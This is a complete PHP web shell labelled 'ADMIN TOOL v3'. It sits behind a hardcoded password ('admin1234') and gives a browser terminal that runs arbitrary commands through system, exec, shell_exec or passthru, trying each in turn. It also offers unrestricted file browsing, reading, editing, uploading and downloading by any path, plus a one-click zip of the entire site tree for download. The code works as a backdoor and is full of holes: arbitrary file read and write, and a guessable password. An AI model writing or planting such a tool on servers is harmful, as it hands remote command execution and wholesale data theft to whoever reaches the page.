<?php
// PASSWORD PROTECTION
$password = 'admin1234';

session_start();
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}
if (isset($_POST['p']) && $_POST['p'] === $password) {
    $_SESSION['auth'] = true;
}
if (!isset($_SESSION['auth'])) {
    die('<form method="post">Password: <input type="password" name="p" autofocus><input type="submit" value="Login"></form>');
}

// Helper
function flash($msg, $color = 'green')
{
    echo "<div style='color:$color;font-weight:bold;margin:10px 0;padding:10px;border:1px solid $color;background:#fff;'>$msg</div>";
}

// DOWNLOAD HANDLER
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
}

// TERMINAL HISTORY HANDLER (Session based)
if (!isset($_SESSION['term_history'])) $_SESSION['term_history'] = [];
if (isset($_POST['clear_term'])) {
    $_SESSION['term_history'] = [];
    header("Location: ?tab=terminal&path=" . urlencode($_GET['path'] ?? ''));
    exit;
}

// Current Directory (Moved up for Zip)
$root = realpath(__DIR__ . '/../../../../');
if (!$root) $root = __DIR__;

// ZIP HANDLER
if (isset($_GET['zip_project'])) {
    $zipFile = sys_get_temp_dir() . '/project_backup_' . date('Ymd_His') . '.zip';
    $source = $root;

    if (!extension_loaded('zip') || !file_exists($source)) {
        die("Error: Zip extension not loaded or source path invalid.");
    }

    $zip = new ZipArchive();
    if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );

        foreach ($files as $name => $file) {
            // Skip looking in .git or uploads if too large (optional optimization)
            if (strpos($file->getRealPath(), '.git') !== false) continue;

            $filePath = $file->getRealPath();
            $relativePath = substr($filePath, strlen($source) + 1);
            $zip->addFile($filePath, $relativePath);
        }
        $zip->close();

        if (file_exists($zipFile)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="project_backup.zip"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($zipFile));
            readfile($zipFile);
            unlink($zipFile); // Cleanup
            exit;
        }
    } else {
        die("Failed to create zip file.");
    }
}

// Current Directory
$path = isset($_GET['path']) ? $_GET['path'] : $root;
if (!is_dir($path) && !is_file($path)) $path = dirname($path);

// TAB HANDLER
$tab = $_GET['tab'] ?? 'files';

// --- ACTIONS ---

// Handle File Upload/Save (Same as before)
if (isset($_FILES['upload_file']) && is_dir($path)) {
    $targetInfo = pathinfo($_FILES['upload_file']['name']);
    $safeName = preg_replace('/[^a-zA-Z0-9._-]/', '_', $targetInfo['filename']) . '.' . $targetInfo['extension'];
    $targetPath = $path . DIRECTORY_SEPARATOR . $safeName;
    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetPath)) {
        flash("Uploaded successfully: $safeName");
    } else {
        flash("Upload failed", 'red');
    }
}
if (isset($_POST['save_content']) && isset($_POST['file'])) {
    // Create Backup
    if (file_exists($_POST['file'])) {
        $bkp = $_POST['file'] . '.' . date('Ymd_His') . '.bak';
        copy($_POST['file'], $bkp);
    }

    if (file_put_contents($_POST['file'], $_POST['save_content']) !== false) {
        flash("Saved successfully (Backup created)");
    } else {
        flash("Failed to save", 'red');
    }
}

// RESTORE HANDLER
if (isset($_GET['restore']) && file_exists($_GET['restore'])) {
    $targetFile = preg_replace('/\.[\d_]+\.bak$/', '', $_GET['restore']);
    if (copy($_GET['restore'], $targetFile)) {
        flash("Restored successfully from " . basename($_GET['restore']), 'green');
    } else {
        flash("Restore failed", 'red');
    }
}

// Handle Command Execution
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $cwd = $_POST['cwd'] ?? $path;
    $output = '';

    // Change directory virtually for this commands context
    $runCmd = "cd " . escapeshellarg($cwd) . " && " . $cmd;

    if (function_exists('system')) {
        ob_start();
        system($runCmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('exec')) {
        exec($runCmd . ' 2>&1', $out);
        $output = implode("\n", $out);
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($runCmd . ' 2>&1');
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($runCmd . ' 2>&1');
        $output = ob_get_clean();
    } else {
        $output = "Execution functions disabled.";
    }

    // Store in history
    $_SESSION['term_history'][] = ['cmd' => $cmd, 'out' => $output, 'cwd' => $cwd];
    $tab = 'terminal';
}

// --- UI ---
?>
<!DOCTYPE html>
<html>

<head>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #f4f4f4;
            padding: 20px;
            margin: 0;
        }

        .container {
            background: white;
            max-width: 1200px;
            margin: 0 auto;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
            overflow: hidden;
        }

        .header {
            background: #333;
            color: white;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .nav {
            background: #eee;
            border-bottom: 1px solid #ddd;
            padding: 0 10px;
        }

        .nav a {
            display: inline-block;
            padding: 15px 20px;
            text-decoration: none;
            color: #555;
        }

        .nav a.active {
            background: white;
            font-weight: bold;
            color: #000;
            border-bottom: 2px solid #007bff;
        }

        .content {
            padding: 20px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
        }

        td,
        th {
            padding: 10px;
            border-bottom: 1px solid #eee;
            text-align: left;
        }

        tr:hover {
            background: #f9f9f9;
        }

        a {
            text-decoration: none;
            color: #007bff;
        }

        a:hover {
            text-decoration: underline;
        }

        .btn {
            padding: 5px 15px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }

        .term-box {
            background: #1e1e1e;
            color: #cfcfcf;
            padding: 15px;
            font-family: monospace;
            min-height: 400px;
            max-height: 600px;
            overflow-y: auto;
            border-radius: 4px;
        }

        .term-entry {
            margin-bottom: 15px;
            border-bottom: 1px solid #333;
            padding-bottom: 10px;
        }

        .term-cmd {
            color: #00ff00;
            font-weight: bold;
        }

        .term-out {
            white-space: pre-wrap;
            margin-top: 5px;
        }

        .action-link {
            margin-right: 10px;
        }
    </style>
</head>

<body>

    <div class="container">
        <div class="header">
            <div><b>ADMIN TOOL v3 (Zip & DL)</b> | Path: <?php echo htmlspecialchars($path); ?></div>
            <div>
                <a href="?zip_project=1" class="btn" style="background:#28a745; text-decoration:none; margin-right:10px;">📦 Download Project (.zip)</a>
                <a href="?logout=1" style="color:#ff9999;">Logout</a>
            </div>
        </div>

        <div class="nav">
            <a href="?path=<?php echo urlencode($path); ?>&tab=files" class="<?php echo $tab == 'files' ? 'active' : ''; ?>">Files & Upload</a>
            <a href="?path=<?php echo urlencode($path); ?>&tab=terminal" class="<?php echo $tab == 'terminal' ? 'active' : ''; ?>">Terminal</a>
        </div>

        <div class="content">

            <?php if ($tab == 'files'): ?>
                <!-- FILE MANAGER TAB (Same as before) -->
                <?php if (is_file($path)): ?>
                    <h3>Editing: <?php echo basename($path); ?></h3>
                    <form method="post">
                        <input type="hidden" name="file" value="<?php echo $path; ?>">
                        <textarea name="save_content" style="width:100%; height:500px; font-family:monospace; padding:10px; border:1px solid #ddd;"><?php echo htmlspecialchars(file_get_contents($path)); ?></textarea>
                        <div style="margin-top:10px;">
                            <input type="submit" value="Save Changes (Auto-Backup)" class="btn">
                            <a href="?path=<?php echo urlencode(dirname($path)); ?>" style="margin-left:10px; color:#666;">Cancel</a>
                            <a href="?download=<?php echo urlencode($path); ?>" class="btn" style="background:#6c757d; text-decoration:none;">Download</a>
                        </div>
                    </form>

                    <!-- BACKUPS LIST -->
                    <div style="margin-top:30px; border-top:1px solid #ddd; padding-top:20px;">
                        <h4>Running Backups (Rollback)</h4>
                        <?php
                        $backups = glob($path . '.*.bak');
                        if ($backups) {
                            rsort($backups); // Newest first
                            echo "<table><tr><th>Backup Date</th><th>Size</th><th>Action</th></tr>";
                            foreach ($backups as $bkp) {
                                $ts = filemtime($bkp);
                                $date = date('Y-m-d H:i:s', $ts);
                                $size = round(filesize($bkp) / 1024, 2) . " KB";
                                $restoreLink = "?restore=" . urlencode($bkp) . "&path=" . urlencode($path);
                                $viewLink = "?path=" . urlencode($bkp); // View backup content
                                echo "<tr>
                                <td>$date</td>
                                <td>$size</td>
                                <td>
                                    <a href='$restoreLink' onclick=\"return confirm('Confirm restore? Current content will be overwritten.')\" style='color:red; font-weight:bold;'>Restore this version</a> | 
                                    <a href='$viewLink' target='_blank'>View</a>
                                </td>
                            </tr>";
                            }
                            echo "</table>";
                        } else {
                            echo "<p style='color:#666;'>No backups found for this file.</p>";
                        }
                        ?>
                    </div>

                <?php else: ?>
                    <div style="margin-bottom:20px; padding:15px; background:#f8f9fa; border:1px solid #ddd; border-radius:5px;">
                        <form method="post" enctype="multipart/form-data">
                            <b>Upload to current folder:</b>
                            <input type="file" name="upload_file" required>
                            <input type="submit" value="Upload" class="btn" style="background:#28a745;">
                        </form>
                    </div>
                    <table>
                        <tr>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Action</th>
                        </tr>
                        <tr>
                            <td><a href="?path=<?php echo urlencode(dirname($path)); ?>">🔙 [..] Parent Directory</a></td>
                            <td>-</td>
                            <td>-</td>
                        </tr>
                        <?php
                        $files = scandir($path);
                        foreach ($files as $f) {
                            if ($f == '.' || $f == '..') continue;
                            $full = $path . DIRECTORY_SEPARATOR . $f;
                            $isDir = is_dir($full);
                            $link = "?path=" . urlencode($full);
                            $downloadLink = "?download=" . urlencode($full);
                            echo "<tr>";
                            echo "<td>" . ($isDir ? "📁" : "📄") . " <a href='$link' style='" . ($isDir ? "font-weight:bold;color:#333;" : "color:#007bff;") . "'>$f</a></td>";
                            echo "<td>" . ($isDir ? "DIR" : round(filesize($full) / 1024, 2) . " KB") . "</td>";
                            echo "<td>";
                            if ($isDir) {
                                echo "<a href='$link' class='action-link'>Open</a>";
                            } else {
                                echo "<a href='$link' class='action-link'>Edit</a> <a href='$downloadLink' class='action-link' style='color:#28a745;'>Download</a>";
                            }
                            echo "</td>";
                            echo "</tr>";
                        }
                        ?>
                    </table>
                <?php endif; ?>

            <?php elseif ($tab == 'terminal'): ?>
                <!-- TERMINAL TAB (HISTORY ENABLED) -->
                <div class="term-box" id="termBox">
                    <?php foreach ($_SESSION['term_history'] as $entry): ?>
                        <div class="term-entry">
                            <div class="term-cmd">root@web:<?php echo htmlspecialchars($entry['cwd']); ?>$ <?php echo htmlspecialchars($entry['cmd']); ?></div>
                            <div class="term-out"><?php echo htmlspecialchars($entry['out']); ?></div>
                        </div>
                    <?php endforeach; ?>
                </div>

                <div style="margin-top:10px;">
                    <form method="post" style="display:flex; gap:10px;">
                        <input type="hidden" name="cwd" value="<?php echo htmlspecialchars($path); ?>">
                        <input type="text" name="cmd" placeholder="Command..." style="flex:1; padding:10px; font-family:monospace;" autofocus>
                        <input type="submit" value="Run" class="btn">
                        <input type="submit" name="clear_term" value="Clear" class="btn" style="background:#dc3545;">
                    </form>
                </div>
                <script>
                    document.getElementById('termBox').scrollTop = document.getElementById('termBox').scrollHeight;
                </script>
            <?php endif; ?>

        </div>
    </div>

</body>

</html>